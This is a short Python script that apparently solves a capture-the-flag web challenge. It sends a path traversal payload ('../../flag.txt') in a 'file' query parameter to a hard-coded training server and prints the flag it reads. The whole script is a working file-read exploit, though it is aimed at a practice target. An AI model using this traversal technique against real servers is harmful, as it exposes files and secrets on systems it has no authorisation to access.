#!/usr/bin/env python3

# Third-party library imports
from requests import get    # pip install requests


def get_flag() -> str:
    """
    Returns the challenge flag https://codeby.games/en/categories/web/cdd2d7e7-495e-4a14-b0ea-cae75b7b21a3

    :return: Flag
    """

    base_url = "http://62.173.140.174"
    port = 16012
    path = "static"
    query_param = "../../flag.txt"

    response = get(f"{base_url}:{port}/{path}?file={query_param}")

    flag = response.text

    return flag


if __name__ == "__main__":
    print(get_flag())
